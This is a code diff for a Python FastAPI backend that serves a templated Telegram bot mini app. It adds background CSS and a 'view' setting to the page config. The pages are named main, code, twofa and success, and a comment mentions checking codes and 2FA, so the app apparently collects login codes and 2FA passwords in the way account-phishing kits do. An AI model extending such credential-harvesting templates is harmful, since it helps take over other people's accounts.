@@ -23,7 +23,14 @@ from fastapi.responses import HTMLResponse
 
 from database import get_bot_by_tg_id, get_template, init_db
 from directlink_service import get_module
-from miniapp_template import ALL_DEFAULTS, PAGE_FIELDS, PAGES, page_field_key
+from miniapp_template import (
+    ALL_DEFAULTS,
+    DEFAULT_VIEW,
+    PAGE_FIELDS,
+    PAGES,
+    background_css,
+    page_field_key,
+)
 
 _MINIAPP_HTML = (Path(__file__).parent / "miniapp.html").read_text(encoding="utf-8")
 
@@ -36,7 +43,7 @@ def _miniapp_config(bot_id: int) -> dict:
     шаблона». Мини-апп проигрывает их по кнопкам — для проверки рендера и
     параметров; бекенд-логика (проверка кода/2FA) подключается отдельно.
     """
-    cfg: dict = {"color": "", "bg": "", "blur": 0, "pages": []}
+    cfg: dict = {"color": "", "bg": "", "blur": 0, "view": DEFAULT_VIEW, "pages": []}
     content: dict = {}
     bot = get_bot_by_tg_id(bot_id)
     if bot and bot.get("template_id"):
@@ -52,8 +59,10 @@ def _miniapp_config(bot_id: int) -> dict:
 
     color = content.get("ui_color") or ""
     cfg["color"] = "" if color in ("", "default") else color
-    cfg["bg"] = content.get("bg") or ""
+    # bg в шаблоне — id градиента / готовый градиент / URL; отдаём готовый CSS
+    cfg["bg"] = background_css(content.get("bg"))
     cfg["blur"] = int(content.get("blur") or 0)
+    cfg["view"] = content.get("view") or DEFAULT_VIEW
     for page in PAGES:  # порядок: main, code, twofa, success
         pdata = {"key": page}
         for field, _label in PAGE_FIELDS[page]:
